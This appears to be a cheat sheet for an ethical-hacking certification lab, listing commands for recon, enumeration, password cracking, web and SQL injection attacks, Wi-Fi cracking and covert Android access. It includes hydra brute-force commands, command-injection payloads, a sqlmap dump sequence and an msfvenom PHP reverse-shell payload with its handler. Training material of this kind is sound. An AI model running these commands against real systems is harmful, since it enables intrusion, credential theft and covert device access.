# General

- Identify geolocation
    1. Go to `https://www.ipvoid.com/ip-geolocation`
    2. Enter the domain name

- Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server. 
    1. Use `Wappalyzer` to find nginx version
    OR
    1. Use `whatweb www.certifiedhacker.com`

- Identify the Content Management System and HTTP Server used by www.cehorg.com.
    1. Use `whatweb www.cehorg.com`


# DNS

- Check for Dns Zone Transfer
    1. `dig www.certifiedhacker.com axfr`

- Find out the name servers used by the domain.
    1. `nslookup`
        > `set type=ns`
        > `www.certifiedhacker.com`


# Nmap

- Identify open ports
    1. `nmap -sS -sV 192.168.1.10`

- Identify the number of live machines in subnet
    1. `nmap -sn -A -T5 172.16.0.0/24`

- Identify the NetBIOS name of the host at 10.10.10.25. 
    1. `nmap -sV -p 137.138,139,445 -T4 10.10.10.25`

- Identify the FQDN of the Domain Controller.
    1. `nmap -sC ip --top-ports=20`

- Identify DNS Computer Name of the Domain Controller
    1. `nmap -sV -A -T5 10.10.10.25`

- Identify the version of the OpenSSH running on the machine.
    1. `nmap -p 22 -sV 192.168.0.0/24`

- Determine the machine OS that hosted the database.
    1. `sudo nmap -sV -O -A -p 3306 192.168.55`

- Identify the IP address of the server running WampServer. 
    1. `nmap -sV -A -p 80,443 182.168.1.0/24`


# Enumeration

- Perform LDAP enumeration on the target network and find out how many user accounts are associated with the domain. 
    1. `ldapsearch -x -h 10.10.10.25 -b "DC=CEHORG,DC=com" "objectclass=user" cn`

- Perform an LDAP Search on the Domain Controller machine and find out the latest version of the LDAP protocol. 
    1. `ldapsearch -h 10.10.10.25 -x -s base namingcontexts`

- Check whether the Message signing feature is enabled or disabled on SMB.
    1. `nmap -p 445 -A -T5 -sV 192.168.0.51`

- Crack the SMB credentials for user Henry
    1. `hydra -l henry -P /home/passlist.txt 192.168.0.1 smb`
    2. `smbclient //192.168.0.1/share`
    3. `smbclient -L 192.168.0.1`

- Crack the FTP credentials
    1. `hydra -L Username.txt -P Password.txt 10.10.1.11 ftp`

- Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine. 
    1. `telnet movies.cehorg.com 80`
    2.  Add values
        - `GET / HTTP/1.0`
        - Double Enter to Start

- Identify the load balancing service used by eccouncil.org.
    1. `lbd eccouncil.org`

- Perform a bruteforce attack on www.cehorg.com and find the password of user adam.
    1. `wpscan --url http://movies.cehorg.com -U adam -P passwords.txt`

# Vulnerability Assessment

- Find out the base score and impact of the vulnerability.
    1. Google the CVE

- Identify the number of vulnerabilities with severity level as "medium".
    1. `sudo gvm-check-setup`
    2. `sudo gvm-start`
    3. Go to `Scans > Tasks`
    4. Click `New Task`
    5. Set:
        1. `Name: "DC"`
        2. `Target: 10.10.10.25`
    6. Save and Start the scan

- What is the severity score of a vulnerability that indicates the End of Life of a web development language platform?

    1. `nmap -Pn --script vuln 172.20.0.16`
    2. Copy the cve number and get the severity score using google.

- Identify the number of live png files in images folder.
    1. Use `curl http://movies.cehorg.com | grep .png | wc -l`
    OR
    1. Use owaspzap


# Password Cracking

- Crack the NTLM password hashes
   1. Crack using `hashes.com`

- Task to audit the passwords of a server present in CEHORG network
     1. Use: Lophtcrack
        - `L0phtCrack -> Password Auditing wizard -> Next -> Next -> A Remote machine -> Remote Host(ip) -> Use specific user credentials -> Username (Administrator), Password (given) -> Next -> ~~~ -> finish`
    OR
    1. Use nmap to find target
        - `nmap -sV -A 10.10.10.*`
    2. Use hydra to bruteforce adam
        - `hydra -l "Adam" -P /home/attacker/Desktop/pass.txt 10.10.10.25 rdp`


# Steganography

- You are asked to investigate a file named Confidential.txt and extract hidden information.
    1. `./SNOW.EXE -C ../../Documents/Confidential.txt`

- You are asked to investigate the file and check if it contains any hidden information.
    1. Download openstego `Setup-OpenStego-0.8.6.exe` from `https://github.com/syvaidya/openstego/releases/tag/openstego-0.8.6`
    2. Go to Extract Data Section
    3. Add the image which data to be extracted in first row
    4. Add folder location in second row where to get extracted file

# Malware

- Analyze the malware and find out the File pos for KERNEL32.dll text. (Hint: exclude zeros.)
    1. Download bintext from `https://majorgeeks.com/files/details/bintext.html`
    2. Add file in bintext and search for string manually

- Analyze an ELF executable (Sample-ELF) file and determine the CPU Architecture it was built for.
    1. Use `Detect It Easy (DIE)`

- During an assignment, an incident responder has retained a suspicious executable file "die-another-day". Your task as a malware analyst is to find the executable's Entry point (Address). The file is in the C:\Users\Admin\Documents directory in the "EH Workstation – 2" machines.
    1. Analyze ELF Executable File using `Detect It Easy (DIE)`
    2. Open manuals go malware analysis folder, static malware analysis folder and packaging and officiation folder then you can DIE folder.
    3. Run the die.exe file in windows, upload the target file then click open now in scanned all now click on file info there you can see the entry point address.
    4. Find the Portable Executable (PE) Information of a Malware Executable File
    5. Open manuals go malware analysis folder, static malware analysis folder and PE Extraction tools folder then you can install and launch it. 
    6. Click on file and upload the file from windows, after uploading it manually open the header file then you can see the entry point address.

- You know that the organization has installed a RAT in the machine for remote administration purposes. Your task is to retrieve the "sa_code.txt" file from the target machine and enter the string in the file as the answer.
    1. `nmap -p 9871,6703 192.168.0.0/24`
    2. now you get open port ip address
    3. now go to the c drive malware/trojans/rat/`theef` and run the client.exe file
    4. now entry the ip of open port and click connect and click on file explorer and find the sa_code.txt.
    5. or search file in cmd using command --→ `dir /b/s “sa_code*”` it shows the path.



# Network

- Covert_TCP manipulates the TCP/IP header of the data packets to send a file one byte at a time from any host to a destination. 
    1. Open .pcap file
    2. `ip.addr==<suspicious-ip>`
    3. Check each packet one by one for hidden message

- Perform windows service monitoring and find out the service type associated with display name "afunix". 
    1. Type this in command prompt `sc qc afunix`

- Analyze the network traffic generated during the attack and find the Transaction ID of the DHCP Discover packets. 
    1. Open wireshark on eth0
    2. Run Yersinia using `sudo yersinia -I`
    3. After entering yersinia `press g -> select DHCP -> enter -> press x -> press 1 (sending discover packet)`
    4. Go to wireshark then `click any DHCP Packet -> Go to Dynamick Host Configuration Protocol -> Get the transaction ID `

- You have been assigned a task to analyze and find out the protocol used for sniffing on its network.
    1. Open file in wireshark
    2. Use `arp` as filter 
    3. now see if there is any traffic with arp
    4. Submit the flag as ARP.

- Find out the packet's id that uses ICMP protocol to communicate.
    1. Filter the `icmp` packet
    2. Now `select an icmp packet -> go on icmp tab -> get the identifier BE id written in ()`

- CEHORG has found that one of its web application movies.cehorg.com running on its network is leaking credentials in plain text.
    1. Open file in wireshark
    2. Use filter `http.request.method==POST`
    3. Open the post message
    4. Go to `http form url encoded tab -> get the credentials`

- Determine the number of machines that were used to initiate the DDOS attack. 
    1. Open file in wireshark
    2. Go to `Statistics -> Converstions -> IPv4`
    3. Get the number of machines that have sended packets

- Identify the severity level of the attack. 
    1. Open file in Wireshark
    2. Open `Statistics -> Conversations` and see the packet count in IPv4.
    3. Open `Analyze -> Expert Information` and see Warning message.

- Analyze the packet and find the alert message sent to the sensor. 
    1. Open the file in wireshark
    2. Filter with `mqtt` and search for any `Publish Message`
    3. Get the Message from `MQ Telementary Transport Protocol Section` 
    4. Check the value of it in hexamdecimal table


# Web Application

- Perform parameter tampering on movies.cehorg.com and find out the user for id 1003.
    1. Change the id parameter to 1003.

- Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. 
    1. Download from `https://github.com/pwn0sec/PwnXSS`
    2. `python3 pwnxss.py -u http://cehorg.com`

- Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine.
    1. Use `| net user`

- The file is located in the directory mentioned below.Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt 
    1. Write this payload (type command is used to view the file)
        - `127.0.0.1 && type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt`

- Analyze the packet and find the topic of the message sent to the sensor.
    1. Open the file in wireshark
    2. Filter with `mqtt` and search for any `Publish Message`

- Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine.
    1. Go to command injection tab
    2. Write this payload 
        - `127.0.0.1 && net user`

- Perform vulnerability research and exploit the web application training.cehorg.com, available at 192.168.0.64. Locate the Flag.txt file and enter its content as the answer.
    1. Scan the target with `Zapp` to find the vulnerability. Then exploit it. It can be file upload/ File inclusion vulnerability on DVWA.
    2. msfconsole in one tab next in new tab
    3. `msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php`
    4. >`use exploit/multi/handler or use 30`
    5. >`set payload php/meterpreter/reverse_tcp`
    6. `Set LHOST ipadd`
    7. Upload a file you created as exploit.php
    8. Open terminal and type run once you get url type url in brower you get meterpreter session then type ls get the files
        

# SQL Injection

- Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. 
    1. `sqlmap -u http://movies.cehorg.com/viewprofile.aspx?id=1 --cookie="mscope=Xf4nda2RM2w=" --dbs -batch`
        - enumerates database name
    2. `sqlmap -u http://movies.cehorg.com/viewprofile.aspx?id=1 --cookie="mscope=Xf4nda2RM2w=" -D moviescope --tables -batch`  
        - enumerates all tables
    3. `sqlmap -u http://movies.cehorg.com/viewprofile.aspx?id=1 --cookie="mscope=Xf4nda2RM2w=" -D moviescope -T User_login --dump -batch`
        - dumps all details

- Exploit the web application available at www.cehorg.com and enter the flag's value at the page with page_id=84.
    1. `nmap -sV --script=http-enum` [target domain or IP address]
    2. Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap.
    3. Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT” you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
    4. `sqlmap -r <txt file from burpsuite> --dbs`
    5. `sqlmap -r <txt file from burpsuite> -D <database name> --tables`
    6. `sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns`
    7. `sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all`
    8. then login and do the url parameter change page_id=1 to `page_id=84`


# Wifi

- Crack the wireless encryption and identify the Wi-Fi password.
    1. `aircrack-ng ‘/home/wireless.cap’`
    2. `aircrack-ng -b 6c:24:a6:3e:01:59 -w ‘/home/wifipass`


# Mobile

- You are assigned to covertly access the user’s device and obtain malicious elf files stored in a folder "Scan".
    1. sudo nmap -p 5555 192.168.0.0/24
    2. adb connect 192.168.0.14:5555
    3. adb shell
    4. adb pull /sdcard/scan/
    5. ent -h or apt install ent
    6. ent evil.elf

- You are assigned a task to attain KEYCODE-75 used in the employees' mobile phone. Note: use option p in PhoneSploit for next page
    1. Search for devices with 5555 open port
        - `nmap -p 5555 --open -sV 172.16.0.0/24`
    2. Go to phonesploit and open it using python
    3. As the tool opens give ip address of the device
    4. Use `24` to get the keycode 
    5. Scroll down to 75 keycode

- You have been assigned a task as an ethical hacker to access the file and delete it covertly. Enter the account information present in the file. Note: Only provide the numeric values in the answer field. 
    1. `adb connect 172.16.0.21:5555`
    2. `adb shell`
    3. `cd storage/self/primary/Download/`

-  the screenshot of the attack using PhoneSploit from the attacked mobile device and determine the targeted machine IP along with send method.
    1. `adb connect 172.16.0.21:5555`
    2. `abd shell`
    3. Go to `sdcard -> DCIM`
    4. `pwd`
    5. Go to Phonesploit and connect to target
    6. Use mode 9 to download the folder and paste the pwd to download it
    7. Open the folder and get the png file

- You are assigned a task to perform security audit on the mobile application and find out whether the application using permission to Read-call-logs.
    1. Go to Virustotal
    2. Upload the file 
    3. Go to `Details Section -> Permissions`
    4. Look for permissions related Read-call-logs


# Cryptography

- Your task is to check the integrity of the files by comparing the MD5 hashes. Compare the hash values and determine the file name that has been tampered with.
    1. Use `HasCalc` Tool to compare hashes

- While auditing the database, the encoded file was identified by the database admin.
    1. Use `BCTextEncoder` to decrypt the file

- The attacker has encrypted the file using the Advance Encryption Package. You have been assigned a task to decrypt the file.
    1. Open `Advance Encryption Package`
    2. Search for the file and double click the file 
    3. now deselect `enter key as hex` and input the password

- You have been tasked to decrypt the encrypted volume and determine the number of files stored in the volume.
    1. Open Veracrypt and Open the file
    2. Now mount it to any disk
    3. provide the given password